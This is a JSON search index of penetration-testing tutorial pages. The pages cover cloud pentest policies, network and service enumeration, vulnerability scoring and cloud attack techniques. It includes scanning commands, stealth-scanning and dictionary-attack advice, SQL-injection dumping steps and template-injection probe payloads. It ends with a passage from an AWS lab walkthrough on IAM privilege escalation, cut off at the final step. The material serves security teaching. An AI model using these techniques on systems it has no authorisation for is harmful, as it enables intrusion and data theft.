    "c": "Challenges and problems  Lack of transparency  Not-so-well-known cloud services often use third party data centers. Users may not know where the data is stored and what hardware or software configuration is used. Such a lack of transparency exposes data to security risks. The cloud service provider may even be gathering and selling sensitive data without the knowledge of the user. Well-known cloud service providers like AWS, Azure, GCP, etc. usually conduct in-house security audits, but these resources cannot be audited by a security auditor the client or user chooses. Nor can clients or users respond if those underlying resources are hacked. This has to be reported, and the CSP will get to it (hopefully). Resource sharing  Cloud services share resources across multiple accounts. This resource sharing can prove problematic, and not only during cloud penetration testing. Some service providers do not even use proper segmentation of the users. If an organisation has a compliancy requirement which states that all the other accounts sharing the resource and the cloud service provider should be PCI DSS compliant too, this can lead to complex cloud infrastructure implementations. And such complex scenarios can make cloud penetration testing hard to do. Policy restrictions  Each cloud service provider has its own policy regarding conducting cloud penetration testing. This policy defines the endpoints and types of tests that can be conducted. And some require an advance notice before testing. These differences in policies can be a challenge and also limits the scope of cloud penetration testing, while black hats have no such squirms. AWS  There are 8 permitted services for Amazon web services on which cloud pentesting can be performed without prior notice. Those are mentioned in the Permitted Services of the Penetration Testing policy . These are not permitted: Denial of Service (DOS) and Distributed Denial of Service Attacks (DDOS). DNS zone walking. Port, Protocol, or Request flooding attacks. If you wish to perform a network stress test, there is a separate policy for that. Azure  Azure allows cloud pentesting on eight Microsoft products which are mentioned in its Penetration Testing Rules of Engagement . These are not permitted: Cloud pentesting on other azure customers or data other than your own. DOS and DDoS attacks or tests which create a huge amount of traffic. Performing intensive network fuzzing attacks on Azure VMs Phishing or any other social engineering attacks against Microsoft employees. Violating Acceptable Use Policy. GCP  The Google Cloud Platform has no special cloud penetration testing policy, you just need to abide by their Acceptable Use Policy and Terms of Service . There is no need to inform Google before testing. The Acceptable Use Policy does not permit: Piracy or any other illegal activity. Phishing. Spamming. Distributing trojans, ransomware, etc. during the tests. Violating the rights of other GCP users or conducting penetration tests on their assets. Violating or trying to circumvent terms of service. Interfering with the equipment supporting GCP. Resources  Cloud Native Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "55e2a7ec52f92c0d92359d62332a0fd3",
    "u": "https://enum.tymyrddin.dev/docs/system/cloud",
    "t": "Scanning cloud infrastructure ",
    "c": "Scanning cloud infrastructure  Most internet resources on cloud providers, like load balancers, content distribution networks, S3 buckets, etc., regularly rotate their IP addresses. If the nmap takes too long, the addresses will have been assigned to another customer and the results will no longer be relevant. Scan domain names, not IP addresses. nmap -F -sV -iL domains.txt -oA results Spotting hidden relationships  Consider the core business and what other servers and datastores there are likely to be. Keep an eye open for information that might indicate where to find those.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "098c1e5cdd78323ada26496c43d9d2ee",
    "u": "https://enum.tymyrddin.dev/docs/system/dns",
    "t": "DNS enumeration ",
    "c": "DNS enumeration  DNS enumeration is possible by sending zone transfer requests to the DNS primary server pretending to be a client. DNS enumerating reveals sensitive domain records in response to the request. Tools  DNS enumeration tools Remediation  Configure DNS servers not to send DNS zone transfers to unauthenticated hosts. Make sure DNS zone transfers do not contain HINFO information. Trim DNS zone files to prevent revealing unnecessary information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc1c5a6c57ac8af2512aff5d7735c05d",
    "u": "https://enum.tymyrddin.dev/docs/app/api",
    "t": "Scanning an API ",
    "c": "Scanning an API  There are two main architectural styles used in modern APIs: SOAP: a highly structured message protocol that supports multiple low-level protocols. REST: a simpler approach to APIs using HTTP/S as the transport protocol, and typically using JSON format for data transfer. Both types of APIs support HTTP requests and responses and Secure Sockets Layer (SSL), but the similarity ends there. The increase of API-related security threats in recent years has prompted the Open Web Application Security Project (OWASP) to release the API Security Top 10, which helps raise awareness of the most serious API security issues affecting organizations. Use either the ZAP-API Scan or Burp API scan . Resources  OWASP API Security Project",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a024b71865d68290052537f1448d20b6",
    "u": "https://enum.tymyrddin.dev/docs/app/automated",
    "t": "Automated vulnerability scanning ",
    "c": "Automated vulnerability scanning  Pros and cons of using Automated vulnerability scanners : Advantages  Automated scans are easy to repeat, and the results can be shared within a team with ease. These scanners are quick and can test numerous applications efficiently. Open-source solutions exist. Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. Disadvantages  People can often become reliant on these tools. They are extremely “loud” and produce a lot of traffic and logging. This is not good if you are trying to bypass security controls. Open-source solutions are often basic and require expensive licenses to have useful features. They often do not find every vulnerability on an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "af269ce6c0ea692e34a159f21705ac1e",
    "u": "https://enum.tymyrddin.dev/docs/system/snmp",
    "t": "SNMP enumeration ",
    "c": "SNMP enumeration  Default SNMP passwords allow attackers to view or modify the SNMP configuration settings. Attackers can enumerate SNMP on remote network devices for: Information about network resources such as routers, shares, devices, etc. ARP and routing tables Device specific information Traffic statistics And more. Tools  SNMP enumeration tools Remediation  Minimize the attack surface by removing the SNMP agents where not needed. Change default public community strings. Upgrade to SNMPv3, which encrypts the community strings and messages. Implement group policy for additional restriction on anonymous connections. Implement firewalls to restrict unnecessary connections. Implement IPSec filtering. Block access to TCP/UDP ports 161. Encrypt and authenticate using IPSEC.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1f26fd1b6a07d6de4a8e205edf448574",
    "u": "https://enum.tymyrddin.dev/docs/overview",
    "t": "Enumeration overview ",
    "c": "Enumeration overview  Enumerate hosts on the network using Zenmap. Zenmap is a version of Nmap that has a graphical interface. Use Zenmap to create a network topology to help identify the network layout. Try to enumerate users and groups. Try to get a list of SMB shares on the system. Enumerate uniform resource locators (URLs) and retrieve any web pages. Identifying the software running on a system can be tricky. Get creative. For example, use Ncrack to do a dictionary attack on the administrator account and then supply that as the credentials to a script to see a list of the processes running on that system. Get lists of services running on a system by performing an nmap scan. Try to obtain security tokens. Enumerate social media posts by a user with a given IP address by using a tool like recon-ng . A full scan does a variety of tests to identify vulnerabilities in the system. For example, Nessus can be set to use a number of plug-ins such as for checking for security issues with Simple Mail Transfer Protocol (SMTP) and Simple Network Management Protocol (SNMP) services, checking for Linux security issues, and checking for web server and Windows vulnerabilities, etc. Such scans are considered to be aggressive. If red teaming or hired to do a penetration test where the security team is not informed of our presence, we can do a stealth scan and are to put more effort into choosing specific scanning techniques to avoid detection by the blue/security team, for example by not scanning the full IP range sequentially, or scanning ports sequentially, and by using multiple source IP addresses to scan from. Compliance scanning by externals has its own rules and requirements. For example, for compliance with the Payment Card Industry Data Security Standard (PCI DSS) standards, these include: Both internal and external scans must be performed. External scans must be approved by an approved scanning vendor (ASV). Vulnerability scans are to be done quarterly and after any major change to the environment. If critical vulnerabilities are found, they must be remediated and then a new scan done to validate the remediation steps have removed the vulnerability. When doing a vulnerability scan on target systems, do it multiple times, as an anonymous, non-credentialed user, and as a credentialed user with and without administrative credentials. As a non-credentialed user we are not to see information such as the password policies configured, group membership, and other configuration settings. As a credentialed user with an administrative account, we may get information about the configuration of the system including vulnerabilities related to user accounts (for example an account called “administrator” or “admin”) and group membership (too many users in the administrators group), missing patches, and password policy configuration settings.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ea87b6ea64a6f9ab6b5d2083ad091f52",
    "u": "https://enum.tymyrddin.dev/docs/system/netbios",
    "t": "NetBios enumeration ",
    "c": "NetBios enumeration  NetBIOS is outdated but still lives on in some older systems, sometimes for backward compatability. It is the equivalent of broadcasting names to look for each other but is not routable. It is local network only. If no one on the other network can use it for your network, then no one there can access your NetBIOS shared folders and printers, unless one has gained access to your local network. You can also access NetBIOS machines with a WINS server. That is the NetBIOS equivalent of a DNS server. NetBIOS software runs on port 139 on the Windows operating system. File and printer services need to be enabled to enumerate NetBIOS over Windows. An attacker can perform the following on the remote machine: Choosing to read or write to a remote machine, depending on the availability of shares. Launching a Denial of Service (DoS) attack on the remote machine. Enumerating password policies on the remote machine. Tools  NetBios enumeration tools Remediation  Minimise the attack surface by minimising the unnecessary service like Server Message Block (SMB). Remove file and printer sharing in Windows OS.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "454ff8ca59627211003a08a68be3a771",
    "u": "https://enum.tymyrddin.dev/docs/vulns/mapping",
    "t": "Mapping vulnerabilities to exploits ",
    "c": "Mapping vulnerabilities to exploits  Attack tree  1 List and score exploitable vulnerabilities 1.1 by Common Vulnerability Scoring System (CVSS) (OR) 1.1.1 Calculate Exploitability 1.1.2 Calculate Impact 1.1.3 f(Impact) 1.1.4 BaseScore 1.2 by Vulnerability Priority Rating (VPR) 2 Prioritisation possibilities 2.1 Severity level 2.2 Vulnerability exposure 2.3 Criticality Common Vulnerability Scoring System (CVSS)  The Common Vulnerability Scoring System (CVSS) is a standard vulnerability scoring system used by vulnerability scanners to identify the severity of the vulnerability. A CVSS base score can be a number from 0 to 10, with 0 being the least severe, and 10 being the most severe. The format of the base score for CVSS2: CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C Three metrics are used to calculate the exploitability of a vulnerability: The access vector (AV), used to measure how the hacker executes the exploit. Does she have to have physical access to the system, be in an adjacent network and use pivoting, or is the vulnerability exploitable from a remote network? The attack complexity (AC), to describe how easy or difficult it is to exploit the vulnerability. Authentication (Au), used to specify how many times she would need to authenticate to exploit the vulnerability. Exploitability = 20 * AV * AC * Au Impact metrics are used to identify what the impact of the exploit is on the confidentiality (C), integrity (I), and availability (A) of systems and their data. The values can be None (N), Partial (P) or Complete (C) Impact = 10.41 * (1-(1-C)*(1-I)*(1-A)) f(Impact) = 0 if Impact = 0, 1.176 otherwise. End score: BaseScore = roundToOneDecimal(( (0.6*Impact) + (0.4*Exploitability)-1.5) * f(Impact)) Vulnerability Priority Rating (VPR)  The VPR framework is a more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself, rather than factors such as impact (like with CVSS). Unlike CVSS, VPR scoring takes into account the relevancy of a vulnerability. For example, no risk is considered regarding a vulnerability if that vulnerability does not apply to the organisation. VPR is also considerably dynamic in its scoring, where the risk that a vulnerability may pose can change almost daily as it ages. VPR uses a similar scoring range as CVSS. Two notable differences are that VPR does not have a None/Informational category, and because VPR uses a different scoring method (youtube) , the same vulnerability will have a different score using VPR than when using CVSS. Nessus  In Nessus, the Vulnerability Information includes whether known exploits are available for a vulnerability. The section labeled “Exploitable With” even shows what tools can be used to exploit the vulnerability. Real Risk Score (RRS)  Real Risk Score (RRS) not only takes into account the equation behind the CVSS of each vulnerability, but also the Metasploit modules that could be launched against it, the malware kits detected, and even how old the vulnerability is. Resources  NVD CVSS v2 Calculator NVD CVSS v3 Calculator Vulnerability Priority Rating (VPR) Summary Real Risk Score",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cfeaea289a0f4fb49ef8e455286cfe4b",
    "u": "https://enum.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Application scanning tools can be used to perform an audit on an application. There are basically two types of application audit tools: A dynamic analysis tool assesses vulnerabilities in an application by analysing the behaviour of the application while it is running (how it responds to input). The best is a combination of scanning and using scanners like Zap and Burp in a manual walkthrough. In a static analysis, the source code is reviewed for vulnerabilities. Can be done manually or using an automated vulnerability scanner. Use both for manual and automated scanning of the application. Why?  Move further and deeper into the scanning process to include security scanning and discover vulnerabilities to exploit. How?  Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "275316b5407eae7e98bb36d23e19b8a5",
    "u": "https://enum.tymyrddin.dev/docs/vulns/prioritisation",
    "t": "Prioritisation of vulnerabilities ",
    "c": "Prioritisation of vulnerabilities  Asset categorisation — how critical is the system that has vulnerabilities? Adjudication — making a decision on whether the vulnerability discovered is a false positive. Review and validate. Prioritisation of vulnerabilities — if a vulnerability exploits confidentiality, integrity, or availability, then that vulnerability would typically take priority. Common Vulnerability Scoring System (CVSS)  Advantages  CVSS has been around for a long time. CVSS is popular in organisations. CVSS is a free framework to adopt and recommended by organisations such as NIST. Disadvantages  CVSS was never designed to help prioritise vulnerabilities, instead, just assign a value of severity. CVSS heavily assesses vulnerabilities on an exploit being available. Only 20% of all vulnerabilities have an exploit available ( Tenable., 2020 ). Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found. Vulnerability Priority Rating (VPR)  Advantages  VPR is a modern framework that is real-world. VPR considers over 150 factors when calculating risk. VPR is risk-driven and used by organisations to help prioritise patching vulnerabilities. Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages. Disadvantages  VPR is not open-source like some other vulnerability management frameworks. VPR can only be adopted separate from a commercial platform. VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity and availability of data does not play a large factor in scoring vulnerabilities when using VPR. Real Risk Score (RRS)  Real Risk Score (RRS) may offer a good alternative. It enriches CVSS data to provide a more precise risk score.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f9f57e43799169b1563d26179028d219",
    "u": "https://enum.tymyrddin.dev/docs/app/scanning",
    "t": "Dynamic web application scanning ",
    "c": "Dynamic web application scanning  Features of the two main web application scanners (community versions): Feature Burp Suite Community Edition OWASP ZAP Burp Suite Pro Web Application Scanning Not Available Available with basic security vulnerabilities Available with quality security vulnerabilities Intercepting Feature Available Available Available Fuzzing Capabilities Available Available Available Encoder and Decoder Available Not Available Available Cost Free Free Paid Subscription Advanced Functionality ($450 per year) Documentation Extensive Little Extensive Spider Available Available Available Updates Available Available Available Extensions Less Options No provision for enhance functionality Available Coverage Medium coverage Less coverage Extensive Coverage False Positive Less More Less Session Token Entropy Analysis Available Not Available Available Comparison Feature Available Not Available Available",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d60a0f3306d489a4438058abb064816a",
    "u": "https://enum.tymyrddin.dev/docs/vulns/more",
    "t": "Discovering more vulnerabilities/exploits ",
    "c": "Discovering more vulnerabilities/exploits  Attack tree  1 Known vulnerabilities/exploits (AND) 1.1 Look up in Exploit databases 1.2 Vulnerability scanning 2 Latent vulnerabilities (AND) 2.1 Security code reviews 2.2 Specific code scanning for vulnerabilities 3 New vulnerabilities 3.1 Root cause analysis 3.2 Variant analysis 3.3 Patch analysis 3.4 Exploit technique analysis 4 New exploits 4.1 Proof-of-concept development (exploit development) 4.2 Cross-compiling 4.3 Modifying an existing exploit 4.4 A new exploit chain (a new on-path) Notes  Manual security code reviews  Manual security code reviews are usually performed by developers or security experts. Such efforts usually take place during a security push or pentesting engagement and are associated with a final security review. Coding errors can be found using different approaches, but even when compared to sophisticated tools, manual code reviews have clearly proven their value in the areas of precision and quality. Unfortunately, manual code reviews are also the most expensive to execute. It is important the developers are not part of the team that created the code, and a facilitator/security professional is also a good idea. New vulnerabilities  New vulnerabilities are usually found through bug bounty programs, or researched by dedicated groups like Google Project Zero. New exploits  Developing your own exploit is a great way to demonstrate proof of concept that the exploit can happen without focusing on performing malicious activity on the target system. Cross-compiling by downloading the source code of an existing exploit and compiling it for another platform. Modifying the exploit to fit your needs before compiling the exploit is also a good option. Exploit chaining uses a combination of different exploits run one after the other. Resources known vulnerabilities  0-days In-the-Wild Blackhat 2020: Reversing the Root (pdf of slides)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54522f627bbdd621763a16e528931aea",
    "u": "https://enum.tymyrddin.dev/docs/system/ntp",
    "t": "NTP enumeration ",
    "c": "NTP enumeration  An attacker can enumerate the following information by querying an NTP server. List of hosts connected to the NTP server Internal client IP addresses, hostnames and operating system used Tools  NTP enumeration tools Remediation  Restrict the usage of NTP and enable the use of NTPSec, where possible. Filter the traffic with IPTables. Enable logging for the messages and events.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "87c7f8b3aca09a9b29a4f4d7273e785b",
    "u": "https://enum.tymyrddin.dev/docs/vulns/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Discover vulnerabilities: Known vulnerabilities are the simplest vulnerabilities which have been discovered and disclosed. These are often found in the libraries and frameworks that are part of an application. These vulnerabilities tend to get hit very quickly (hours) after disclosure by automated attacks from all over the world, so response speed is critical. Latent vulnerabilities are instances of typical vulnerability classes.: buffer overflows, cross-site scripting (XSS) and SQL injection for example.These vulnerabilities are not listed in databases – these are unique to each application. New vulnerabilities represent a new class of vulnerability. These appear at a slow rate, maybe one or two per year. After discovery, research and confirmations, these turn into latent vulnerabilities. There is a learning curve on these new vulnerabilities for attackers and defenders. This type of research is expensive and for most companies unlikely to produce much payoff in terms of overall risk reduction. Why?  To compromise the security of the system and potentially gain full access to the system. How?  Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "36d98026c869ed6b8d5fb4b4f6dc6d45",
    "u": "https://enum.tymyrddin.dev/docs/system/ldap",
    "t": "LDAP enumeration ",
    "c": "LDAP enumeration  LDAP supports anonymous remote queries on the server. The query will disclose sensitive information such as usernames, address, contact details, etc. Tools  LDAP enumeration tools Remediation  Use SSL to encrypt LDAP communication Use Kerberos to restrict the access to known users Enable account lockout to restrict brute-forcing Create a few Active Directory Decoy accounts Enable auditing on those accounts Run Bloodhound’s Sharphound tool Perform LDAP Reconnaissance activities within the active directory environment Detect the activities in Windows event logs.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "107794ffefe7d0da979c234ae03f2a2e",
    "u": "https://enum.tymyrddin.dev/docs/app/binaries",
    "t": "Download or obtain and decompile binaries ",
    "c": "Download or obtain and decompile binaries  Download or obtain binaries and then use a decompiler to analyse the binary . Review the application in a debugger. Look for information such as remote systems the application connects to, database connection strings, or usernames and passwords used by the application (there may be a backdoor).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb6e186f91b8d4679c6f5a5c847724c8",
    "u": "https://enum.tymyrddin.dev/docs/system/linux",
    "t": "Linux enumeration ",
    "c": "Linux enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if linux shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc. Various built-in commands and utilities Tools  Linux enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "90a4cd9ec2bd9e8e4a00397f11ccfa44",
    "u": "https://enum.tymyrddin.dev/docs/system/smtp",
    "t": "SMTP enumeration ",
    "c": "SMTP enumeration  SMTP provides three built-in commands: VRFY: Validate users on the SMTP servers EXPN: Delivery addresses of aliases and mailing lists RCPT TO: Defines the recipients of the message SMTP servers respond differently to the commands mentioned above, and SMTP enumeration is possible due to varied responses. Attackers can determine the valid users on the SMTP servers with the same technique. Tools  SMTP enumeration tools Remediation  Ignore email responses from unknown recipients. Disable open relay functionality. Prune any sensitive information like mail server and localhost in the mail responses.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e51a3a5b7a01adf9feec37ef369c98d7",
    "u": "https://enum.tymyrddin.dev/docs/system/windows",
    "t": "Windows enumeration ",
    "c": "Windows enumeration  Get information: Usernames Default configurations Default passwords Domain names Computer names Shares Windows information Network information like DNS , SMTP , SNMP information Application details Banners Routing tables Tools  Windows enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "517b315e6fd40e47e801db5896d51370",
    "u": "https://enum.tymyrddin.dev/docs/system/macos",
    "t": "macOS enumeration ",
    "c": "macOS enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if macOS shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc Various built-in commands and utilities Tools  macOS enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7a7948d45c2b893ccde3bfea260a6c84",
    "u": "https://enum.tymyrddin.dev/docs/app/database",
    "t": "Enumerate databases ",
    "c": "Enumerate databases  Gather information using database enumeration tools : Find a page url with a GET request parameter Test different SQL injection methods against the request parameter List information about the existing databases List information about tables present in a particular database List information about the columns of a particular table Dump the data",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cee55ab4f5890c064bbed72e7189817c",
    "u": "https://enum.tymyrddin.dev/",
    "t": "Lay of the land ",
    "c": "Lay of the land  Move further and deeper into the scanning process to include security scanning. Enumeration is particularly useful in networks that contain unprotected network resources and services. The distinction between reconnaissance and remote enumeration is an arbitrary grey area, and during enumeration new hosts and/or services may show up, so what you can not find here you may find there . Preparation Build a local testlab Enumeration overview Systems Introduction NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure Web applications Introduction Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API Vulnerability identification Introduction Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "167124ae5bf3c44da18ff419f98dfcf3",
    "u": "https://enum.tymyrddin.dev/docs/system/virtual",
    "t": "Scanning virtualised systems ",
    "c": "Scanning virtualised systems  Some systems may be running on virtual machines or containers. Depending on the configuration of the virtualisation environment, it may not be possible to communicate with some virtual machines and containers if they are not connected to the network or are configured to network with one another, but not the real network. In this scenario, set up a virtual machine to connect to the private virtual machine network to do a vulnerability scan or look for vulnerability scanners that can have an agent installed in the virtual machines to be scanned.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e8b808f9d750cbb9239bf279386fb2dc",
    "u": "https://enum.tymyrddin.dev/docs/system/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  System enumeration is a process of connecting to and interrogating a network or system to retrieve information about that network or system. Take information already gathered during reconnaissance (like IP addresses) and during scanning (open ports) and gather as much data about the targets and services running on the targets, using a variety of techniques and tools. Why?  To discover potential attack vectors in the system, and further exploitation of the system. Items of great interest: Network services that are running but not in use. Default user accounts that have no passwords. User accounts that have a revealed password. Guest accounts that are active. Security tokens. How?  NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e797684de532b03aaac5623ca99328ab",
    "u": "https://cloud.tymyrddin.dev/docs/api/poor-lambda-authoriser",
    "t": "Poor Lambda authoriser ",
    "c": "Poor Lambda authoriser  Lambda authorizers is an API Gateway feature that uses a Lambda function to control access to the API. Based on the information provided in the request, ie tokens, request parameters, etc., the lambda function returns a policy that allows or denies access to the API. In this lab, we will take a look at how a poorly built lambda authorizer can be leveraged to access the API. Objective: Bypass the authorization and retrieve the flag.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b22e433029be0e2e329224369d41f77",
    "u": "https://cloud.tymyrddin.dev/docs/notes/cloud-centric",
    "t": "Cloud-centric attacks ",
    "c": "Cloud-centric attacks  Some attacks, such as DoS, have specialised context when applied to the cloud. Other attacks focus on services available only within cloud environments, such as malware injection and side-channel attacks for cloud resources. These attacks can be used to gain further access within a cloud environment or to use the cloud environment as an attack tool to accomplish goals against other Internet-facing targets. Denial of service  Cloud based DDoS attack vectors include CoAP (Constrained Application Protocol), WS-DD (Web Services Dynamic Discovery), ARMS (Apple Remote Management Service). These newly discovered DDoS vectors are network protocols that are essential to the devices they are being used in (IoT devices, smartphones, Macs), and device makers are unlikely to remove or disable the protocols in their products, hence this serious threat of DDoS attacks. Volumetric attacks  Volumetric attacks try to take up bandwidth or connections on their targets. Cloud resources are an attractive way to amplify an attack or to mask the true source of the attack. UDP reflection attacks can use protocols like Apple Remote Management Service, Web Services Dynamic Discovery (WS-DD), Constrained Application Protocol (CoAP), LDAP, and Memcached, all of which can be exposed by cloud resources. Direct-to-origin attacks  If real IPs are revealed, attackers can bypass protections and attack IP addresses directly. This is a direct-to-origin attack. Content delivery networks (CDNs) are designed to shoulder the bulk of the load. Massive amounts of traffic can therefore be serviced by relatively few systems. Attacking those few directly can quickly overload the target. The cached content in the CDN will still be serviced, but dynamic content can’t be generated and distributed. Malware injection  XSS and SQLi attacks also work in the cloud. And there are additional vectors of attack for malware injection in the cloud. Attackers may be able to use the access acquired through other attacks to inject malicious content into served images or cloud services. Good controls for integrity management are not often considered. Server-side template injection  Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers’ internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point. If fuzzing a template by injecting a sequence of special characters commonly used in template expressions, such as ${{<%[%'\"}}%\\ , raises an exception, it indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist. Plaintext context check: If requesting a URL such as: http://vulnerable-website.com/?username=${7*7} , renders 49 in the response, this shows that the mathematical operation is being evaluated server-side, and is vulnerable. Code context check: first establish that the parameter doesn’t contain a direct XSS vulnerability by injecting arbitrary HTML into the value, the try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it. If renders blank, either not vulnerable, or the wrong language was used for the test. If NOT renders blank, vulnerable. Templating languages use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used. Submitting invalid syntax is often enough because the resulting error message will tell exactly what the template engine is, and sometimes even which version. Side-channel attacks  These attacks abuse weaknesses in hardware to capture information from other instances. They are difficult to execute, and the data returned is not always predictable. Abusing software development kits  Cloud-based software development kits (SDKs) include command-line interfaces (CLIs) to interact with the cloud. Amazon implements awscli . Google Cloud Platform (GCP) implements the gcloud tool. Azure has the az tool. These may also include various other libraries to help interact with services. And, many organisations are going the route of using Infrastructure as Code (IaC). These are all powerful tools, but this means that keys, secrets, configurations, and the data these tools become a very attractive goal. Pentesting will have to focus on finding weaknesses in the implementation of policies and practices designed to protect this information throughout the provisioning and management process, especially when cloud SDKs and CI/CD are involved. Remediation  Most businesses try to get their cloud infrastructure built as cheaply as possible. Due to poor coding practices, the applications offer SQLi, XSS, CSRF vulnerabilities to hackers. The most common are listed in OWASP top 10. It is these vulnerabilities that are the root cause for the majority of cloud web services being compromised. Outdated software contains critical security vulnerabilities that can compromise cloud services. Most software vendors do not use a streamlined update procedure or the users disable automatic updates themselves. This makes the cloud services outdated which hackers identify using automated scanners. APIs are widely used in cloud services to share information across applications. And insecure APIs can therefor also lead to a large-scale data leak by: Improper use of HTTP methods like PUT, POST, DELETE in APIs can allow hackers to upload malware on the server or delete data. Improper access control and lack of input sanitization are also the main causes of APIs getting compromised. Resources  AWS IP address ranges AWS IP ranges (.json) GrayHat Warfare",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dbe659a8856b611242faebc1bf4e8cb9",
    "u": "https://cloud.tymyrddin.dev/docs/api/mis-private-api",
    "t": "Misconfigured private API ",
    "c": "Misconfigured private API  API Gateway supports private API which can only be accessed through VPC endpoints. While creating such APIs, special care should be taken while writing out the resource policy as one misconfiguration can allow anyone to interact with the API. Objective: Interact with the private API and retrieve the flag.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4be95fa6a383ab96de97d451b7bf919a",
    "u": "https://cloud.tymyrddin.dev/docs/iam/overly-permissive-1",
    "t": "Overly permissive permission I ",
    "c": "Overly permissive permission I  Overly Permissive Permission can be abused by a user to perform privileged operations. Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account. Get access to AWS lab credentials. Configure AWS CLI. Check identity with: aws sts get-caller-identity List the policies attached to the student user: aws iam list-attached-user-policies --user-name student Check policy details for the Service policy: aws iam get-policy --policy-arn arn:aws:iam::862839114976:policy/Service View policy details for the v1 version of Service policy: ┌──(kali㉿kali)-[~] └─$ aws iam get-policy-version --policy-arn arn:aws:iam::862839114976:policy/Service --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Statement\": [ { \"Action\": \"iam:AttachUserPolicy\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::*:user/*\" } ], \"Version\": \"2012-10-17\" }, \"VersionId\": \"v1\", \"IsDefaultVersion\": true, \"CreateDate\": \"2023-05-11T09:02:39+00:00\" } } Try creating a new user, named bob: ┌──(kali㉿kali)-[~] └─$ aws iam create-user --user-name Bob An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:iam::527058492733:user/student is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::527058492733:user/Bob because no identity-based policy allows the iam:CreateUser action FAIL. Get AdministratorAccess policy arn : ┌──(kali㉿kali)-[~] └─$ aws iam list-policies | grep 'AdministratorAccess' \"PolicyName\": \"AdministratorAccess\", \"Arn\": \"arn:aws:iam::aws:policy/AdministratorAccess\", \"PolicyName\": \"AdministratorAccess-Amplify\", \"Arn\": \"arn:aws:iam::aws:policy/AdministratorAccess-Amplify\", \"PolicyName\": \"AWSAuditManagerAdministratorAccess\", \"Arn\": \"arn:aws:iam::aws:policy/AWSAuditManagerAdministratorAccess\", \"PolicyName\": \"AdministratorAccess-AWSElasticBeanstalk\", \"Arn\": \"arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk\", Attach administrator policy to the current user: 